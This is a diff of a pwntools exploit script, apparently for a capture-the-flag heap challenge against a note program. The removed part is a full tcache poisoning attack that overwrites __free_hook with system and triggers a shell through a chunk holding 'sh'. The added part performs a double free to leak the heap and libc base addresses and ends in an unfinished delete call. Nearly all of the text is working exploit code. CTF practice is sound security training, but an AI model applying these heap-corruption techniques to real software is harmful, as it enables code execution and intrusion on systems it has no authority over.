@@ -43,29 +43,33 @@ def show(idx):
     ru(b'[*] Note index: \n')
     sl(i2b(idx))
 
-ru(b"printf: ")
-libc_base = int(ru(b"\n", drop=True), 16) - libc.sym.printf
+#  tcache attack
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+add(0x20, b"aaa")
+for i in range(7):
+    delet(i)
+delet(8)
+delet(9)
+delet(8)
+heap_base = (u64_ex(rn(8)) << 12)
+lg("heap_base")
+
+add(0x500, b"aaa")
+add(0x60, b"bbb")
+delet(2)
+show(2)
+libc_base = u64_ex(rn(8)) - 0x219ce0
 lg("libc_base")
 
-#  tcache attack
-add(0x70, b"aaa")
-add(0x70, b"aaa")
-add(0x70, b"aaa")
-add(0x70, b"aaa")
-
-delet(3)
-delet(2)
-delet(1)
-delet(0)
-
-add(0xf70, b"aaa")
-payload = b"a"*0x78 + p64(0x81)
-payload += p64(libc_base + libc.sym.__free_hook - 0x10)
-# payload += p64(0xdeadbeef)
-edit(0, payload)
-# add(0x70, b"cat /flag > ./hello\x00")
-add(0x70, b"sh\x00")
-add(0x70, p64(libc_base + libc.sym.system)*3)
-delet(1)
+add(0x420, b"aaa")
+delet()
 
 ia()
